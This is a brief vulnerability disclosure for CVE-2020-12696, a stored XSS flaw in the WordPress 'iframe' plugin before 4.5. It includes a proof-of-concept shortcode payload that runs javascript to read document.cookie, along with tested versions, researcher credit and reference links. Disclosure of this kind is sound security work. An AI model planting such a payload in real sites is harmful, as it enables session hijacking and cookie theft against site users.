# CVE-2020-12696

```
██╗  ██╗███████╗███████╗
╚██╗██╔╝██╔════╝██╔════╝
 ╚███╔╝ ███████╗███████╗
 ██╔██╗ ╚════██║╚════██║
██╔╝ ██╗███████║███████║
╚═╝  ╚═╝╚══════╝╚══════╝
```  

**Iframe < 4.5 - Authenticated Stored Cross Site Scripting (XSS)**

The iframe plugin before 4.5 does not sanitize a URL.

    Payload: </b>[iframe src="javascript:confirm(document.cookie)" width="100%" height="500"]
    Version [plugin]: </b>4.4
    Tested on: </b>WordPress 5.2.4
    Researcher:</b> Guilherme Rubert

<br>

**References:**

https://guilhermerubert.com/blog/cve-2020-12696/
<br>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12696
<br>https://wordpress.org/plugins/iframe/#developers




